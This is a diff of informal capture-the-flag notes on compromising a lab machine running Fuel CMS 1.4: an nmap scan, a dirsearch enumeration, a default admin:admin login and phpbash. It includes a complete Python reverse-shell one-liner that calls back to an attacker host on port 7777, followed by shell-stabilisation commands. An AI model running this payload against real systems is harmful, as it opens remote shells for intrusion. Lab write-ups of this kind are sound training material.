@@ -1,3 +1,4 @@
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap 10.10.211.172           
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 18:25 EDT
@@ -45,13 +46,11 @@ Initiating NSE at 18:35
 Completed NSE at 18:35, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 509.61 seconds
-
+```
 
 dirsearch took me to login directory and sadly and most disapointedly admin:admin
 
 so I'm in, 
-
-
 
 Fuel CMS
 Version 1.4
@@ -63,15 +62,7 @@ Apache/2.4.18 (Ubuntu) Server at 10.10.211.172 Port 80
 /var/www/html/fuel/application/views/home.php 
 
 
-
-
 loged in played around and looks like they have a script checking for scripts, probably could have made it work since it was giving the errors, but too much programing
-
-
-
-
-
-
 
 
 went to first write up, phpbash a command line in your browser, well that sounds cool, 
@@ -92,11 +83,12 @@ We need a real shell
 
 we inject this command into the webpage and we get a real shell on port 7777
 
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
+```
 stabilize that shell 
 
-python -c 'import pty; pty.spawn("/bin/bash")'
+`python -c 'import pty; pty.spawn("/bin/bash")'`
 
 control + Z
 
@@ -105,17 +97,11 @@ stty raw -echo;fg
 
 so he says the flag is in where the app would store it, found it, 
 
-www-data@ubuntu:/var/www/html/fuel/data_backup$ cat index.html
-
-
-
-
-
-
-
+`www-data@ubuntu:/var/www/html/fuel/data_backup$ cat index.html`
 
 this was a trip, messages through dirsearch
 
+```bash
 ┌──(kali㉿kali)-[~/dirsearch]
 └─$ python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.211.172 
 /home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.4) or chardet (4.0.0) doesn't match a supported version!
@@ -322,4 +308,4 @@ CTRL+C detected: Pausing threads, please wait...
 [20:50:17] 400 -    1KB - /!help
 
 Task Completed
-         
+```         
